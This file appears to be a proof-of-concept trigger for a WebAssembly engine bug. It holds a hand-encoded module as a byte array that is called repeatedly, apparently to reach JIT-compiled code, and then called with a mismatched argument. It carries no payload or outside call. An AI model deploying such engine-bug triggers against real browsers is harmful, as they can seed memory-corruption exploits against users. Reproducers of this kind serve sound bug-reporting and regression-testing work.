async function poc() {
    const wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 14, 2, 95, 1, 100, 113, 0, 96, 1, 111, 1, 127, 3, 2, 1, 1, 7, 7, 1, 4, 109, 97, 105, 110, 0, 0, 10, 15, 1, 13, 0, 6, 127, 32, 0, 251, 65, 0, 26, 65, 1, 7, 65, 0, 11, 11]);
    try {
        const wasm_module = await WebAssembly.instantiate(wasm_code);
        const main = wasm_module.instance.exports.main;
        const arg = {};
        for (let i = 0; i < 25000; ++i) {
            main(arg);
        }
        main(arg);
    } catch (e) {
        
    }
}
poc();